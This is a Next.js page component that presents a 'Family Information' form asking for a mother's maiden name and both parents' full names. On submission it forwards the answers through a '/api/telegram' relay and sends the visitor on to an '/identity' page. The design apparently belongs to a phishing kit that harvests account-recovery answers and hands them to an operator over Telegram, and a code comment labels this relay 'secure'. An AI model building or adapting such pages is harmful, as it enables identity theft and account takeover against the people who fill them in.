'use client';

import { useState } from 'react';
import styles from './family.module.css';
import { useRouter } from 'next/navigation';

type FamilyFormData = {
  motherMaidenName: string;
  motherFullName: string;
  fatherFullName: string;
};

const initialForm: FamilyFormData = {
  motherMaidenName: '',
  motherFullName: '',
  fatherFullName: '',
};

export default function FamilyInfoPage() {
  const [form, setForm] = useState<FamilyFormData>(initialForm);
  const [errors, setErrors] = useState<string[]>([]);
  const [submitted, setSubmitted] = useState(false);
  const router = useRouter();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setForm(prev => ({ ...prev, [name]: value }));
  };

  const validateForm = (): string[] => {
    const errs: string[] = [];

    if (!form.motherMaidenName.trim()) errs.push("Mother's maiden name is required.");
    if (!form.motherFullName.trim()) errs.push("Mother's full name is required.");
    if (!form.fatherFullName.trim()) errs.push("Father's full name is required.");

    return errs;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();

    if (validationErrors.length > 0) {
      setErrors(validationErrors);
      return;
    }

    setErrors([]);
    setSubmitted(true);

    const message = `👨‍👩‍👧‍👦 Family Info Submission:
Mother's Maiden Name: ${form.motherMaidenName}
Mother's Full Name: ${form.motherFullName}
Father's Full Name: ${form.fatherFullName}`;

    try {
      // ✅ Secure server-side API call
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message }),
      });

      if (!response.ok) {
        throw new Error("Failed to send message");
      }

      setForm(initialForm);
      router.push('/identity');
    } catch (err) {
      console.error(err);
      setErrors(['Submission failed. Please try again later.']);
    } finally {
      setSubmitted(false);
    }
  };

  return (
    <div className={styles.familyPage}>
      <form className={styles.card} onSubmit={handleSubmit} noValidate>
        <h2 className={styles.heading}>Family Information</h2>

        {errors.length > 0 && (
          <ul className={styles.errors}>
            {errors.map((err, idx) => <li key={idx}>{err}</li>)}
          </ul>
        )}

        <div className={styles.row}>
          <InputField
            label="Mother’s Maiden Name *"
            name="motherMaidenName"
            value={form.motherMaidenName}
            onChange={handleChange}
          />
          <InputField
            label="Mother’s Full Name *"
            name="motherFullName"
            value={form.motherFullName}
            onChange={handleChange}
          />
          <InputField
            label="Father’s Full Name *"
            name="fatherFullName"
            value={form.fatherFullName}
            onChange={handleChange}
          />
        </div>

        <button type="submit" className={styles.submitButton} disabled={submitted}>
          {submitted ? 'Submitted' : 'Submit'}
        </button>
      </form>
    </div>
  );
}

type InputProps = {
  label: string;
  name: keyof FamilyFormData;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
};

function InputField({ label, name, value, onChange }: InputProps) {
  return (
    <label className={styles.label}>
      {label}
      <input
        type="text"
        name={name}
        className={styles.input}
        value={value}
        onChange={onChange}
      />
    </label>
  );
}
